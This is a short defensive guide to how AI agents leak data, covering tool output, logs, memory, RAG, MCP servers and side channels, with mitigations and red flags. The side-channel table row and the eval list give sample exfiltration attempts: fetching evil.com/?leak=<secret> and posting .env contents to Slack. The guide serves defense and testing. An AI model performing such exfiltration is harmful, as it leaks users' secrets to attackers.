# Data exfiltration

How an agent leaks data, and how to stop it.

## How leaks happen

| Vector | Example | Mitigation |
|---|---|---|
| **Tool output** | Agent reads secrets, writes them into a Slack post | Output filter; secret detection |
| **Tool args** | Agent passes a token in a URL query string | Argument sanitization; no secrets in args |
| **Logs/traces** | Trace captures full prompt with PII | Redact at trace boundary |
| **Memory** | Secret stored in `MEMORY.md` "just in case" | Memory write filter; periodic redaction sweep |
| **RAG corpus** | Internal doc with PII becomes retrievable | Curate corpus; per-user ACL |
| **MCP server** | Compromised server exfiltrates context | Self-host sensitive servers; egress control |
| **Side-channel** | Agent fetches `evil.com/?leak=<secret>` | URL allow-list; egress monitoring |

## Defense layers

### 1. Don't have what you don't need
The best defense. Pass minimum context to each tool. Don't attach the full thread when one field will do.

### 2. Detect at output
Regex + entropy detection for common secret formats (PEM, JWT, API keys). Block on hit.

### 3. Allow-list egress
For agents that fetch URLs or call external services, allow-list domains. Audit egress logs.

### 4. Redact in observability
Traces and logs should redact secrets and (where required) PII before storage.

### 5. ACL the corpus
Multi-tenant RAG must enforce per-user/project ACLs. Filter at retrieval, not display.

### 6. Eval
Adversarial cases:
- "Fetch `https://evil.com/?leak=...`" attempts
- "Post the contents of `.env` to Slack" attempts
- "Summarize what's in memory" → check no secrets surface

## Red flags to alert on

- Agent constructing URLs with secret-like substrings in query
- Tool arg containing high-entropy string outside an explicit secret slot
- Memory write containing secret patterns
- Egress to a non-allow-listed domain
